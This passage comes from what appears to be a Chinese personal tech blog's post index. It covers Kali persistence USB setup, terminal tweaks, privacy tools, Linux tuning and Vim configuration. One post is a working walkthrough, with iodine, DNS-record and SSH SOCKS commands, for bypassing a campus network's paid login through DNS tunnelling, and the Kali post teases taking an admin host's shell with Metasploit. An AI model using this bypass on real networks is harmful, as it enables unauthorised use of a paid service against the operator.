启动项选择接着上面的继续来……首先，重启你的操作系统。在此过程中，不停的敲击键盘上左上角的 Esc 按键（请注意，此刻手速得快）。 之后，你就会看到如下界面： 选择 UEFI 项回车，如上图 然后，就进入到了 Kali live 的一些模式选择，如下图： 此处，我选择的是第四项，persistence 持久化；而第五项 encrypted persistence 则是加密持久化。回车…… 0x03 骚操作之创建持久化Kali（重点）经过漫长等待，终于进入到桌面。 打开终端，先查看一下磁盘信息：1# fdisk -l 如下图，得到如下信息，简单概括为： sdc 为我的移动硬盘（你的不一定是 sdc ，看实际大小） 931.5G大小 分区了，为了数据安全，此处一定要注意，你的不一定是 sdc ，可能是 sdb 或者其他1# fdisk /dev/sdc /dev/sdc 即为我的移动硬盘，此命令即对我的移动硬盘进行分区1234Command (m for help):nPartition type: p primary e extended 回车后，先输入 n 即代表 new 新建一个分区，回车出现以上提示： p primary (主分区) e extended (扩展分区) 输入 p （默认主分区，或直接）回车，选择主分区：1Select (default p):p 分区号和第一扇区默认，直接回车：12Partition number（3,4 default 3）：First sector（6131712-1953525167, default 6131712）: Last sector 这里就是设置此分区的总大小，我勉强给300G：12Last sector, +sector or +size{K,M,G,T,P}(6131712-1953525167, default 1953525167): +300GCreated a new partition 3 of type 'Linux' and of size 300 GiB. 最后，输入 w 保存：123Command (m for help): wThe partition table has been altered.Syncing disks. 至此，分区完毕。 这时，lsblk 可以查看一下，然后给刚刚分的区设置文件系统及创建持久化设置，如下图：12345# lsblk# mkfs.ext4 -L persistence /dev/sdc3# e2label /dev/sdc3 persistence 到这儿，快结束了…… 创建挂载点 1# mkdir -p /mnt/disk 挂载 (mount) 1# mount /dev/sdc3 /mnt/disk 写入持久化配置文件 1# echo \"/ union\" &gt; /mnt/disk/persistence.conf 卸载（umount） 1# umount /mnt/disk 重启（reboot） 1# reboot -i 0x04 最后请注意： 重启后，还是和上面进入启动项一样，选择第二项： 这里还是选择第四项 persistence : 至此，持久化Kali 创建完毕咯…… 可能还有后话哦（metasploit 拿网管主机shell）…… 未完待续……","link":"/2018/11/10/便携式Kali-Linux创建/index.html"},{"title":"心比天高，命比纸薄","text":"我思故我在！！！ ​ 嗟夫！予尝求古仁人之心，或异二者之为，何哉？不以物喜，不以己悲；居庙堂之高则忧其民；处江湖之远则忧其君。是进亦忧，退亦忧。然则何时而乐耶？其必曰“先天下之忧而忧，后天下之乐而乐”乎。噫！微斯人，吾谁与归？ 范仲淹《岳阳楼记》","link":"/2018/10/13/自我反思及感触/index.html"},{"title":"关于 Terminal 的一些骚姿势","text":"关于 Terminal 窗口、字体大小以及背景透明度，请自行选择合适方案。 关于那些除了装逼的 Terminal 特效，我就不提了。（譬如好莱坞😎） 写在前面 关于终端模拟器（Updated by 2019.03.18）其实在图形化上使用的都不算是真真正正的终端，算终端模拟器。真正的终端其实是最小化安装系统的那个黑界面。 而 Ubuntu 上自带终端模拟器其实并不怎样，而在应用商店有一个 Terminator（终结者）还算不错。 可去 Ubuntu Software 点击下载，也可使用命令安装； 1$ sudo apt install terminator 关于shell主题 我使用的 shell 主题名为 Sweet ，如下图所示 关于字体 另外，我使用的为一款优秀的开源字体 Hack ，如下图 0x00 彩虹喵lolcat这玩意儿是一个将你在终端输入命令后，显示的文本颜色修改为彩虹色，还是比较漂亮的。如你所愿，它被托管在 Github 。仓库地址：https://github.com/busyloop/lolcat 安装首先，安装 git 和 gem1$ sudo apt install git gem 其次，克隆 lolcat 仓库1$ cd /opt &amp;&amp; sudo git clone https://github.com/busyloop/lolcat.git 最后使用 gem 安装 lolcat12$ cd /opt/lolcat/bin$ gem install lolcat 使用使用方法很简单，即在你要执行的命令后面加上它，譬如1$ cat /proc/cpuinfo | lolcat 0x01 neofetch显示系统Info这条命令可以个性化地显示当前系统的一些信息，比较酷…… 安装1$ sudo apt install neofetch 使用（附图）1$ neofetch 0x02 fish外壳 一个友好、互动的命令行shell。 不可食用，但用着很舒服的一条鱼。官网：http://fishshell.com/Github仓库：https://github.com/fish-shell/fish-shell 安装1$ sudo apt install fish 使用如果你是短期使用的话，则可以直接在终端输入命令1$ fish 如果你喜欢它，想长期，则应该右击你的终端窗口，选择 配置文件首选项 （英文就是 Preferences ）。然后在上方栏选择 命令 或者 Command ，勾上第二行，并在其下方输入 /usr/bin/fish 。如下图所示： 0x03 oh-my-zsh美化 说起 oh-my-zsh ，必须得提 zsh ，和上面的 fish 以及系统默认的 bash ，均属同一类型。也就是说，这三者只能选其一。而我选择的就是 zsh ，搭配 oh-my-zsh 美化。官网：https://ohmyz.sh/Github仓库：https://github.com/robbyrussell/oh-my-zsh 快速开始此前得预先安装 zsh1$ sudo apt install zsh 然后安装 wget 或者 curl ，以及必须的 git1$ sudo apt install wget curl git 安装最后使用 wget 或者 curl 来安装 oh-my-zsh （两者二选一）1$ sh -c \"$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" 1$ sh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 美化配置 插件首先，标准的一些插件可在 ~/.oh-my-zsh/plugins/ ，这个目录下找到。其次，自定义的插件，你应该添加到 ~/.oh-my-zsh/custom/plugins/ 目录。最后 ，配置文件1$ vi ~/.zshrc 找到类似与下面这串字符，添加在括号之中。（每一个插件应单独占一行）123plugins=( git) 主题编辑配置文件1$ vi ~/.zshrc 找到 ZSH_THEME 选项，将你喜欢的主题名替换双引号之中的。譬如，我喜欢随机主题，那么就应该是这个样子。1ZSH_THEME=\"random\" 保存并退出。 0x04 Byobu 一个窗口管理器和终端多路复用器； 以及终端窗口下方的一排系统监视器。官网：http://byobu.orgGithub仓库：https://github.com/dustinkirkland/byobu 安装1$ sudo apt install byobu 快捷键 F1 - 配置菜单 F2 - 添加一个窗口 F3 - 移至左边窗口 F4 - 移至右边窗口 ……其他，具体看配置菜单中的 help …… 关联oh-my-zsh配合 oh-my-zsh 一起使用会更完美，首先编辑一个配置文件1$ vi $HOME/.byobu/.tmux.conf 然后将以下内容写入此配置文件中12set -g default-shell /usr/bin/zshset -g default-command /usr/bin/zsh 保存并退出，完毕！ 永久使用还是和上面的 fish 一样，右击你的终端窗口，选择 配置文件首选项 （英文就是 Preferences ）。然后在上方栏选择 命令 或者 Command ，勾上第二行，并在其下方输入 /usr/bin/byobu 。如下图所示： 一件小事使用了 byobu ，但你右击终端右（左）上角的关闭按钮，其实终端并没有关闭。它还在后台运行着，这时你想真真正正地去关闭它，得使用命令去关闭。1$ exit 最后搞完了，来跑个小火车庆祝一下😍","link":"/2018/12/01/关于-Terminal-的一些骚操作/index.html"},{"title":"几个对于个人隐私的小工具","text":"不一样的浏览器 Tor Browser（The Onion Router，洋葱浏览器） 之前的A站近千万条数据遭公开贩卖、华住约140G用户数据被拖至DarkWeb贩卖， 倒过来想，做黑产的人为何如此胆大妄为； 原因就在于 DarkWeb 为其们提供了一层保护伞。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;聊起暗网，也更不得不提及吃洋葱，应该是 洋葱浏览器，一个使用Firefox开源内核的Browser，即 Tor Browser。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而在国内，Tor常被用来突破GFW;Tor会自动检测节点是否可达目标地址，如果返回Error无法到达，它会自动更换节点。当然也有在墙内创建Tor网桥，用来帮助墙内用户使用。 Tor用户分布图 端对端加密 Telegram Message（一款开源的跨平台的即时通信软件） 本人目前正在使用的一款 IM,由俄某某富豪为个人隐私而推出，个人感觉很不错…… 图解秘密聊天模式 MTProto聊天记录加密方式 源代码库 依旧还是托管在最大的同性交友平台https://github.com/telegramdesktop/tdesktop 某些问题 干扰遭受与封禁 墙内无法使用 且服务器曾多次遭受DDoS 恐怖活动 ISIS，就不多聊了 色情、版权侵犯 强调不鼓励色情内容及版权侵犯存在 用户自行举报 注册或登录出现banned 前段时间出现大量+86恶意注册 可能需得换个号注册 或Twitter@smstelegram（亲测） 墙内代理使用，而非微屁恩 注册时仍需搭一下梯子 进入后右上角搜索@TgProxies 代理方式 SOCKS5 MTProto(建议) 参见 Telegram-维基百科 https://zh.wikipedia.org/wiki/Telegram 洋葱浏览器－维基百科 https://zh.wikipedia.org/wiki/洋葱路由器 近五亿人隐私－36kr https://36kr.com/p/5150594.html 注意 部分链接打开请自行搭梯子","link":"/2018/10/11/谈谈个人对于隐私所使用到的几个工具/index.html"},{"title":"Bypass 校园网认证","text":"郑重声明： 本文仅限于教育学习研究、技术学习，严🈲用于商务及非法等损害某企业的事情；如若产生任何法律纠纷问题，均与本人无干系！！！ 本文在绝大数人眼里或许是篇福利文；在此文中我将介绍如何通过 DNS TUNNEL 的方式来绕过校园网认证，实现免认证免费上网；或许此招式并不是最优解，但对于绝大多数校园认证网确实能够成功实现。 怎么说呢？？？其实我早盯上了某网，这篇文章是早晚的事。😏 场景分析 / Scene Analysis扯蛋篇在某所高校中，存在一家网络运营商，主要面向毫无收入的学生们，为汝等提供日常上网冲浪。 其特点就是三字：贵、差、抠😒。每月79RMB的高昂费用；网络质量差，打游戏经常460；还特么只让三个设备使用，这点或许也可通过某种方式绕过。 没办法，我虽不用此校园网，但还是看不下去，遂有了本文的诞生。 信息收集在这所高校的网络中，统一使用的是 WiFi 热点客户端认证方式；当连上 WiFi 后，本机会向 DHCP 服务器获取一个内网 IP；关于这个 IP 地址，起初还让我很是疑惑，没想到在资源如此匮乏的大天朝，此运营商还会分一个公网 IP 给俺； 后来才知道这是个保留地址，详见其 维基百科 。 Address block Scope Description 100.64.0.0/10 私有网络 共享地址空间 在未认证前还会弹出一个下载认证客户端软件的页面，这里所用到的恶心技术就是利用 HTTP 协议的缺陷，当我们访问一个 HTTP 的网站时，网关会对这个响应报文劫持篡改，给我们302重定向到一个指定的下载认证客户端页面。而当我们打开一个 HTTPS 是不可能被劫持的，但也不可能打开，443端口被限制了。 上图就是重定向后的客户端下载页面，让我匪夷所思的是最上面的那个位置本该是一个域名，为何是个公网 IP。既然没有使用域名，那何必需要 DNS，何不直接关闭53端口，为何让我如此这般有机可乘；实在让我百思不得其解🤔。 由下图可得知，DNS 53端口是开启的。 原理简述原理其实很简单。由上述信息得知，校园网认证过程一般需要放行 DNS 和 DHCP 报文，也就是53和67/68端口。53端口既可以是 UDP，也可是 TCP；67/68端口走的是 UDP 传输协议。 本文着重点是 DNS 53端口，其实 UDP 67也可以绕过认证；但本文将围绕 DNS 53来实现绕过认证，不讨论后者。 而在这个53端口中，网关/防火墙如果不进行报文检查，那么就也将意味着，任何数据包都可以通过此端口传输；如果真的是这样的话，那就很简单了，直接 openVPN 架起，详见此文 利用openVPN实现udp53,67,68端口绕过校园网认证上网 。 但是，恰巧不幸的是，这种情况是很少存在的，也就是说53端口仅只允许 DNS 报文通过。如果是这种情况，还是有办法的。办法就是，使用 DNS 隧道。 简单来讲，既然53端口的 DNS 数据包可以通过网关/防火墙，那么就可以在本机运行一个程序，用来将其他端口数据包伪装成 DNS 数据包，发送到本地 DNS 服务器，这样网关/防火墙也不会进行拦截。但是这样仅只是将数据发送出去，如何回来呢？回来需要两个东西，一个是 VPS ，另一个就是域名。还得在域名购买商那里做如下解析设置： 主机记录 类型 值 NS d2t tunnel.fanqxu.com A tunnel 148.70.218.239 以上，d2t 和 tunnel 可以随意命名，最好还是命名规范；另外，VPS 公网 IP 为148.70.218.239。还有一点就是 VPS 是某马家的学生云，在此文发布之后，或可能未续费而停掉。意思就是说，不要想着搞我服务器了，虽然公网 IP 暴露了。 然后步入正题做个假设，我们在本机 PC 上将数据包伪装成 DNS 数据，且向本地 DNS 服务器指定将要查询一个域名，而本地域名服务器收到数据后，并不能成功解析，便只能将此数据包进行转发，转发到哪里呢？请注意上表中的 NS 记录，就是用来指定一个域名由 VPS 来进行解析；所以毫无疑问，数据包顺利地到达服务器。接下来我们同样可以在 VPS 上运行一个同样的程序，用来对伪装的数据包来进行还原，然后再将还原的数据包发送到互联网中。再然后服务器就会收到回来的响应数据包，再对此响应包进行 伪装成 DNS 响应数据包，按照过来的路径，反向地将伪装好的 DNS 响应数据包发送到本机 PC，PC 收到 DNS 伪装响应包后，再对其进行还原，最终达到本机 PC 收到真正需要的数据包。 开始实战 / Start Combat原料属性 VPS Ubuntu 16 serevr 带宽 1 Mbps IP 148.70.218.239 Domain fanqxu.com 主机记录 记录 值 NS d2t tunnel.fanqxu.com A tunnel 148.70.218.239 PC Ubuntu 18 desktop 伪装程序前面谈原理的时候，说到需要一个对数据包做 DNS 伪装的程序。而这个实现这种功能的程序有很多。 就拿我用过的两款软件来说，第一个是 dns2tcp，第二个，也就是要说的主角就是 iodine。由于前者相较于后者较复杂，使用未成功，故弃之，主要说后者。 官网：https://code.kryo.se/iodine/ Github：https://github.com/yarrick/iodine 服务器由于是 Debian 系，所以安装特简单。 1$ sudo apt-get install iodine 然后运行起来 1$ sudo iodined -f -c -P password 10.0.0.1 d2t.fanqxu.com 参数解释： 123-f 前台运行-c 禁用检查所有传入请求的客户端IP地址；默认情况，来自不匹配IP请求将被拒绝。-P 设置认证密码 后面那个 IP 得是一个保留地址，再然后跟一个所要查询的域名。就这样让程序在 VPS 后台运行着。 客户端同样是 Debian 系，安装方法同样。 1$ sudo apt-get install iodine 然后运行着，不要停止。 1$ sudo iodine -f -P password d2t.fanqxu.com 再然后，通过 ssh 服务器，使用9999端口来作为转发端口。 1ssh ubuntu@10.0.0.1 -D 9999 不用很久，就会登录到服务器。 当出现上图标记的那段文字，即为成功。 代理开启系统自带代理 或者使用浏览器插件 SwitchyOmega（墙裂推荐） Github：github.com/FelisCatus/SwitchyOmega 代理服务器即本机，端口9999。 测试 质量 / Quality关于网速我绕过认证次数总共两次，第一次是在凌晨接近2点左右，那时候网速还行；而第二次在在写这篇文章的白天下午，速度是出了奇的慢，打开个百度将近十秒钟。 另外，也和我的 VPS 出口带宽有莫大的关系；毕竟只有1Mbps。 未遵循标准的结果TCP/IP 四层体系结构已明确规定各个协议的作用，如果非要在不该传输正常数据的端口中传输一切数据，那结果也可想而知。 着重强调 / Emphasis本文仅限于教育学习研究、技术学习！！！生命不止，折腾不息Reference UDP 53 免费上网、DNS 隧道经验谈 利用openVPN实现udp53,67,68端口绕过校园网认证上网","link":"/2019/03/20/Bypass-campusNet/index.html"},{"title":"Linux 桌面性能瓶颈优化","text":"我表示已经放弃了 Ubuntu，转向了流弊一批的 Arch。 遂将曾经使用 Ubuntu 的经验记录下来，并分享出去。 当然此文并不限于 Ubuntu Desktop。 0x00 SSD 硬盘分区对齐关于如今的固态硬盘，已不再需要手动分区对齐。因为目前主流 Linux 系统都已自动对齐文件系统和分区【页面大小4096字节】。 优化原则由于频繁写操作会磨损固态硬盘，所以对于其优化原则就是：【尽量减少写操作】。 文件系统类型而对于文件系统类型，墙裂推荐【EXT4】，EXT4 文件系统的日志会对硬盘多产生一些写操作，但不会太多；不建议关闭所有日志，因为日志对于恢复系统的崩溃较为重要。 禁用写操作时间戳操作系统在对于文件读取时，同时还会对文件的时间戳进行一个写操作；而这个写操作的意义是非常小，所以建议关闭。 编辑分区表，为你的根分区和 Home 分区 都增加 noatime 选项。 1$ sudo vim /etc/fstab 如下，由于我并没有将 Home 分区单独分出来，所有仅在 / 分区的 options 位置添加了 noatime。 123456789# &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;# /dev/sda1UUID=4a7fcb3e-fdcc-4c03-9ee3-de3c5ds3da30 / ext4 noatime,rw,relatime 0 1# /dev/sda2UUID=F06E-6942 /boot/EFI vfat rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro 0 2# /dev/sda3UUID=c9e9e9d5-cde4-4ab4-adf9-027d56384e10 none swap defaults 0 0 禁用休眠计算机休眠挂起会导致磁盘会导致大量的写操作，好在 Ubuntu 默认关闭，请不要开启。 碎片整理许多从 Windows 上转移到 Linux的同学可能会思考关于磁盘碎片整理的问题。而 Linux 下不必要进行碎片整理，非但不必要，而且还得避免碎片整理。碎片整理会导致大量的写操作，对 SSD 是致命的伤害。由于 Linux 系统的特性，不同于 Windows，也没必要进行碎片整理。 TRIM 定期清理磁盘Ubuntu 默认已经安装 TRIM，可通过一下命令查看是否支持。 123$ sudo hdparm -I /dev/sda | grep TRIM * Data Set Management TRIM supported (limit 8 blocks) * Deterministic read ZEROs after TRIM 查看服务状态： 12345$ sudo systemctl status fstrim.service● fstrim.service - Discard unused blocks on filesystems from /etc/fstab Loaded: loaded (/usr/lib/systemd/system/fstrim.service; static; vendor preset: disabled) Active: inactive (dead) Docs: man:fstrim(8) 可看到此服务是关闭状态；因为默认一周清理一次，没必要时时对硬盘进行清理。 指定根分区节点，手动清理： 1$ sudo fstrim -v / 自定义每日清理： 12$ sudo mkdir -v /etc/systemd/system/fstrim.timer.d$ sudo vim /etc/systemd/system/fstrim.timer.d/override.conf 添加如下几行： 123[Timer]OnCalendar=OnCalendar=daily 硬盘缓存所谓缓存，其本质上就是一块内存空间；缓存机制会在 CPU 读取硬盘数据之前，提前将数据放入缓存之中；CPU 需要读取数据时，从而可以从缓存之中读取数据，进而从整体上提高系统的运行效率。此处缓存所指写缓存。 程序在运行中，会等待数据在写入到硬盘之后才会进行下一步操作。因为数据如果不写入至硬盘，还停留在内存中，一旦断电内存中的数据就会丢失。Ubuntu 默认没有开启写缓存；而对于有电源的笔记本，这是不必要的。所以建议笔记本 Linux 用户开启写缓存。PC 台式机谨慎！！！ 打开 【Disks】工具，先在左侧选择你的磁盘，然后点击右上角。找到【Drive Setting】开启【Enable Write Cache】 0x01 CPU安装微码介于 CPU 的完全，建议安装微码安全补丁。安装之后也会对 CPU 的性能有小的提升。 Intel 1$ sudo apt install intel-microcode AMD 1$ sudo apt install amd64-microcode 温度监视安装一个温度监视器。 1$ sudo apt install lm-sensors 查看： 12345678910111213141516171819202122$ sensors coretemp-isa-0000Adapter: ISA adapterPackage id 0: +32.0°C (high = +100.0°C, crit = +100.0°C)Core 0: +30.0°C (high = +100.0°C, crit = +100.0°C)Core 1: +30.0°C (high = +100.0°C, crit = +100.0°C)acpitz-acpi-0Adapter: ACPI interfacetemp1: +32.0°C (crit = +103.0°C)nouveau-pci-0100Adapter: PCI adapterGPU core: +0.60 V (min = +0.60 V, max = +1.20 V)iwlwifi-virtual-0Adapter: Virtual devicetemp1: +27.0°C pch_skylake-virtual-0Adapter: Virtual devicetemp1: +27.5°C 0x02 内存优化限制 inode 缓存其实我也不太懂这是啥，便从维基上抄了下面这句话。顺便吐槽一句，几天前，伟大的天朝将中立的维基百科已【全面封锁】；早在此前，仅是中文页面被封锁。下一个会不会是 Github 呢！！！ inode是指在许多“类Unix文件系统”中的一种数据结构。每个inode保存了文件系统中的一个文件系统对象（包括文件、目录)、设备文件、socket、管道), 等等）的元信息数据，但不包括数据内容或者文件名[1]。 还是建议内存大一点的限制 inode 缓存，多大呢？大于4G吧。 这样做的代价就是，某些系统项将在内存中保留更长的时间。好处就是使计算机速度有明显的提升。 1$ sudo vim /etc/sysctl.conf 添加如下配置至尾行： 1vm.vfs_cache_pressure=50 Tmp 放入内存Tmp 目录用于存放一些中间临时数据的目录，但是其位于硬盘，如果将其放入内存(Tmpfs)中，这将大大提高一些数据读写的效率。还是建议内存大于8G的这么做。 12$ sudo cp -v /usr/share/systemd/tmp.mount /etc/systemd/system/$ sudo systemctl enable tmp.mount 重启生效，查看状态： 1234567891011121314$ systemctl status tmp.mount ● tmp.mount - /tmp Loaded: loaded (/etc/fstab; generated) Active: active (mounted) since Sat 2019-04-27 10:57:47 CST; 1h 20min ago Where: /tmp What: tmpfs Docs: man:fstab(5) man:systemd-fstab-generator(8) Tasks: 0 (limit: 4915) Memory: 32.0K CGroup: /system.slice/tmp.mountApr 27 10:57:47 4rch systemd[1]: Mounting /tmp...Apr 27 10:57:47 4rch systemd[1]: Mounted /tmp. 如何取消呢？只需将此文件删除即可。 1$ sudo rm -v /etc/systemd/system/tmp.mount 0x03 SWAP 分区由于内存的有限，所有当运行一个很大的程序时，系统会将一部分内存交换至 swap 交换分区中； swap 分区即为硬盘，与内存相比较，在速度上是有很大的差距的。 而且 Ubuntu 默认当还剩60%内存时就开始将一部分内存交换至 swap 分区中。 12$ cat /proc/sys/vm/swappiness 60 修改 swappiness 参数。 1$ sudo vim /etc/sysctl.conf 添加以下参数至以上配置文件的尾行。这个数值只是一个百分百，可以按照自己的需求自定义。 1vm.swappiness=10 0x04 显示撕裂在正确安装 NVIDIA 显卡驱动之后，依旧有时候会出现窗口撕裂的现象。（AMD 貌似没有这回事） 这时就需要编辑 grub 配置文件来解决。 1$ sudo vim /etc/default/grub 修改以下一行配置： 1GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\" 在 quiet 后增加 nvidia-drm.modeset=1，如下。 1GRUB_CMDLINE_LINUX_DEFAULT=\"quiet nvidia-drm.modeset=1\" 然后更新 grub，重启生效。 1$ update-grub &amp;&amp; reboot 验证： 123$ xrandr --verbose | grep PRIME PRIME Synchronization:1 PRIME Synchronization:1 0x05 启动项优化Linux 下很多启动(开机自启)项默认都是隐藏状态；使用一条替换命令，显示所有启动项。 1$ sudo sed -i 's/NoDisplay=true/NoDisplay=false/g' /etc/xdg/autostart/*.desktop 然后打开 Startup Applications，按照个人需求自定义关闭不需要的启动项。 0x06 浏览器优化限制 Firefox 写操作将 Firefox 网络缓存放入内存中，可提高运行速度；当然内存太小不建议这样操作。 首先打开 Firefox，在浏览器地址栏输入： 1about:config 回车，点击I accept the risk。 搜索 browser.cache.disk.enable，双击将 Value 由 true变为false。 再次搜索browser.cache.memory.enable，将 Value 变为true。 再然后右击，点击New，选择Integer，输入browser.cache.memory.capacity，点击 OK，输入值204800。 禁用 Firefox sessionstore由于恢复 Firefox 意外崩溃的回话会导致大量的写操作，这对于 SSD 硬盘是很受伤的，所以建议关闭。 搜索 browser.sessionstore.interval，将原来的值15000修改为15000000。 禁用无必要网络访问对于使用 Firefox 来进行 Web 应用程序截断代理、漏洞挖掘。使用过 BurpSuite 就会知道，可能经常会抓到一些其他无相关的站点的数据包， 这是 Firefox 在后台偷偷地去请求一个网址，这当然是我们不想看到的结果；它之所以这么做，是基于一种网络可用性探测的需求，这样做会消耗我们的带宽、以及降低小小的运行效率。 搜索network.captive-portal-service.enabled，双击将 Value 由 true变为false。 限制 Chrome 写操作Settings—-&gt;Advanced—-&gt;Privacy—-&gt;Use a prediction service to load pages more quickly 关闭此项。 0x07 系统清理清理系统不需要的缓存等等 12$ sudo apt autoremove$ sudo apt autoclean 不得不承认这两条命令清理的并不彻底。 StacerGithub：github.com/oguzhaninan/Stacer 从仓库主页 releases 中找到以 .deb 结尾的软件包，下载并安装。这款软件是图形化操作，界面比较友好。 1$ sudo dpkg -i stacer_1.0.9_amd64.deb Bleachbit这款软件貌似系统自带，搜索打开即可使用。其界面并没有 Stacer 那么友好，但清理的特别彻底。 关于系统清理，如果操作不当；轻则破坏你的个性化设置，严重可能会导致系统崩溃。请谨慎操作！！！ 0x08 优化电池寿命关于优化电池寿命，其实是一件非常复杂的问题。所以，我使用的是一种简单的办法，可能并不是十全十美，但依旧能满足大部分人的需求。 安装一个软件包，并将电池优化的工作交给它。 1$ sudo apt install tlp tlp-rdw 然后启动它： 12$ sudo tlp startTLP started in AC mode. 查看 tlp 状态： 1$ sudo tlp-stat tlp 优化的结果可能并不是最最最优的结果，但它完全能满足我们这些非专业人士的电池优化需求。","link":"/2019/04/26/linux-optimization/index.html"},{"title":"Vim 搭建 Python 开发环境入坑","text":"原本用着 Pycharm 好好的，可是它有点占用资源；每次在打开的过程中，CPU 直彪向 100% ，打开后稳定下来才恢复正常；也不知道这种情况是否属正常现象，网上的解决方案都无果。 由此便有了此文…… 0x00 先说一下我的环境 OS : Ubuntu18.04 Python 3.6.7 1$ sudo apt install python3 pip 18.1 1$ sudo apt install python3-pip Vim 8.0 + 1$ sudo apt install vim 0x01 版本检查如果你的操作系统已经安装了 vim ，你需要先检查一下它的版本；尽可能的将你的 vim 升级到新版本（vim 8.0+），否则可能会影响后续操作，出现版本不兼容之类的问题。 1$ vim --version 如上图所示，就算正常了。 0x02 Vim 安装若安装的版本不对，那么先卸载它，然后重新安装 1$ sudo apt purge vim 注：使用 purge 可将其配置文件一并移除掉，比 remove 移除的更加干净。 如果没有安装 vim ，那就这个样子 1$ sudo apt install vim 0x03 插件管理器 即 Vundle ，是 Vim bundle 的缩写，一个广泛使用的插件管理器。 Github 仓库：https://github.com/VundleVim/Vundle.vim 安装先安装一个分布式版本控制系统1$ sudo apt install git 然后将其克隆到本地1$ git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim 请注意大小写，这条命令就是将 Vundle 克隆到本地的 ~/.vim/bundle/ 目录下 配置文件回到你的家目录，创建 vim 的配置文件 .vimrc ，然后编辑它 $ cd ~ &amp;&amp; touch .vimrc &amp;&amp; gedit .vimrc 再然后，将下面这一段复制到配置文件 .vimrc 中，其中的 “ 相当于一般的配置文件中的 # ，在一段中，“ 后面的语句都算注释语句，不生效；第十一行空着的目的就是，如果以后你想再添加其他的插件，那么其语句都应在空着的这行之中。 12345678910111213set nocompatible \" 必须，加载vim自带和插件相应的语法和文件类型相关脚本filetype off \" 必须要添加set rtp+=~/.vim/bundle/Vundle.vim \" 设置包括vundle和初始化相关的runtime pathcall vundle#begin()\" 另一种选择, 指定一个vundle安装插件的路径\"call vundle#begin('~/some/path/here')\" 让vundle管理插件版本,必须Plugin 'gmarik/Vundle.vim'\" 添加你的所有插件在这儿 (注意Vundle的旧版本使用Bundle而不是Plugin)\" 你的所有插件需要在下面这行之前call vundle#end() \" 必须filetype plugin indent on \" 必须，加载vim自带和插件相应的语法和文件类型相关脚本 开始安装了安装这里有点绕，其实就是在终端打开 vim ，在命令模式（也就是直接进去的状态）下输入下面这条命令回车，这里得提供一下动态图，看图。 1:PluginInstall 稍等，完成安装后右下角会出现 Done! 届时，再退出去。 其他常用命令除了安装插件的命令，还有一些其他的命令。 :PluginList - 列出所有已配置的插件 :PluginInstall - 安装插件,追加 ! 用以更新 :PluginUpdate - 更新插件 :PluginSearch foo - 搜索 foo ; 追加 ! 清除本地缓存 :PluginClean - 清除未使用插件,需要确认; 追加 ! 自动批准移除未使用插件 0x04 代码补全 强大的代码补全插件，即 YouCompleteMe 。 依赖在安装 YouCompleteMe 前，需安装相关依赖 Ubuntu 16.04及更高版本 1$ sudo apt install build-essential cmake python3-dev 安装将下面一行写入到配置文件 .vimrc 的相应位置（上面有说过），然后打开 vim 输入 :PluginInstall 回车进行安装。 1Plugin 'Valloric/YouCompleteMe' 等着…… 配置相应语言支持如需 Ｃ 语言家族支持(可选)1$ ./install.py --clang-completer 如需 Java(可选)1$ ./install.py --java-completer 如需所有语言1$ ./install.py --all 对于 Python３ 还需配置1$ python3 install.py -all 至此完毕，另外关于 YouCompleteMe 配置文件，我会在最后说…… 0x05 文件树 NERDTree 是 Vim 编辑器的文件系统资源管理器。使用此插件，用户可以直观地浏览复杂的目录层次结构，快速打开文件以进行读取或编辑，以及执行基本的文件系统操作。 Github 仓库：https://github.com/scrooloose/nerdtree 安装还是和上面安装 YouCompleteMe 插件一样，将下面一行添加到配置文件 .vimrc 中的 Plugin ‘Valloric/YouCompleteMe’ 的下一行，然后打开 vim 输入 :PluginInstall 回车进行安装。 1Plugin 'scrooloose/nerdtree' 关于它的配置，最后再说…… 0x06 代码诊断 ALE（异步Lint引擎）是一个插件，用于在编辑文本文件时在NeoVim 0.2.0+和Vim 8中提供linting，并充当Vim 语言服务器协议客户端。 Github 仓库：https://github.com/w0rp/ale ALE充当“语言客户端”以支持各种语言服务器协议功能，包括： 诊断（通过语言服务器协议连接） 转到定义（:ALEGoToDefinition） 完成（let g:ale_completion_enabled = 1加载ALE之前） 寻找参考（:ALEFindReferences） 悬停信息（:ALEHover） 符号搜索（:ALESymbolSearch） 插件安装在这里我使用 git ，将其克隆到本地 ~/.vim/bundle/ 下。 1$ cd ~ / .vim/bundle &amp;&amp; git clone https://github.com/w0rp/ale.git 代码分析pylint 这是一个 Python 静态代码分析工具，它将配合 ALE 一起使用，可以查找编程错误，帮助强制执行编码标准，嗅探代码异味并提供简单的重构建议。 Github 仓库：https://github.com/PyCQA/pylint 官网：http://pylint.pycqa.org/en/latest/ pip安装 由于 pip 安装东西权限不好解决，故应先切换到 root 用户再进行安装 123$ sudo -i ……# pip install pylint --upgrade 0x07 关于 Vim 的配置 在上面安装了几个插件，我们就可以按照自己的需求来配置实现相应功能。即对 .vimrc ，此文件进行配置。 我的 .vimrc其实，我的这份配置文件也是在网上找的，做了个整合，还对一些语句做了注释（不然都看不懂）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138\"vundle配置\" set the runtime path to include Vundle and initializeset rtp+=~/.vim/bundle/Vundle.vim \" 设置包括vundle和初始化相关的runtime pathcall vundle#begin()\"call vundle#begin('~/some/path/here') \" 另一种选择, 指定一个vundle安装插件的路径\" 让vundle管理插件版本,必须Plugin 'gmarik/Vundle.vim'Plugin 'Valloric/YouCompleteMe'let g:ycm_key_invoke_completion = '&lt;c-z&gt;' \" 提示快捷键Plugin 'scrooloose/nerdtree'\" 添加你的所有插件在这儿 (注意Vundle的旧版本使用Bundle而不是Plugin)Plugin 'jistr/vim-nerdtree-tabs'autocmd VimEnter * NERDTreeBundle 'davidhalter/jedi-vim'let g:SimpyIFold_docstring_preview=1 \" 完成补全后自动消失预览窗口let g:ycm_server_python_interpreter='/usr/bin/python3' \" 